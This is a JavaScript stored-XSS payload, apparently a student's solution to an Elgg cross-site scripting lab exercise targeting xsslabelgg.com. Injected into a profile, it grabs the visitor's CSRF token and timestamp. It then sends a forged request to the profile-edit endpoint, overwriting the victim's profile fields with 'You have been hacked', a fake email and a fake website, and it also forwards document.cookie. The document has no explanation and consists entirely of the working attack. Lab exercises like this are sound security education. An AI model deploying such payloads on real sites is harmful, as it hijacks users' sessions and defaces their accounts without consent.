<script type="text/javascript">
    window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="__elgg_token="+elgg.security.token.__elgg_token;

    //Construct the content of your url.
    var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN


    //Referer: http://www.xsslabelgg.com/profile/alice/edit
    var referer = "http://www.xsslabelgg.com/profile/" + elgg.session.user.name + "/edit";



    /*

    &description=%3Cp%3Ehemlo%3C%2Fp%3E%0D%0A&accesslevel%5Bdescription%5D=2
&briefdescription=&accesslevel%5Bbriefdescription%5D=2
&location=&accesslevel%5Blocation%5D=2
&interests=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Binterests%5D=1
&skills=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bskills%5D=1
&contactemail=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bcontactemail%5D=1
&phone=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bphone%5D=2
&mobile=&accesslevel%5Bmobile%5D=1
&website=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bwebsite%5D=1
&twitter=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Btwitter%5D=1
&guid=44
	
    */

    var namee = elgg.session.user.name;

    var userid = elgg.page_owner.guid;

    var data = new FormData();
    data.append('__elgg_token', elgg.security.token.__elgg_token );
    data.append('__elgg_ts', elgg.security.token.__elgg_ts);

    data.append('name', namee);

    data.append('description', '1605069');
    data.append('accesslevel[description]', 1);

    data.append('briefdescription', 'You have been hacked');
    data.append('accesslevel[briefdescription]', 1);

    data.append('location', 'You have been hacked');
    data.append('accesslevel[location]', 1);

    data.append('interests', 'You have been hacked');
    data.append('accesslevel[interests]', 1);

    data.append('skills', 'You have been hacked');
    data.append('accesslevel[skills]', 1);

    data.append('contactemail', 'hacked@gmail.com');
    data.append('accesslevel[contactemail]', 1);

    data.append('phone', 'You have been hacked');
    data.append('accesslevel[phone]', 1);

    data.append('mobile', 'You have been hacked');
    data.append('accesslevel[mobile]', 1);

    data.append('website', 'www.hacked.com');
    data.append('accesslevel[website]', 1);

    data.append('twitter', 'You have been hacked');
    data.append('accesslevel[twitter]', 1);

    data.append('guid', elgg.session.user.guid);

    if(elgg.session.user.guid != elgg.page_owner.guid)
    {
		//Create and send Ajax request to modify profile
		var Ajax=null;
    Ajax=new XMLHttpRequest();
    Ajax.open("POST",sendurl,true);
    //Ajax.setRequestHeader("Host","www.xsslabelgg.com");
    //Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.setRequestHeader("Referer",referer);
    Ajax.setRequestHeader("Cookie",document.cookie);

    Ajax.send(data);
    console.log('success');
	}
	}
</script>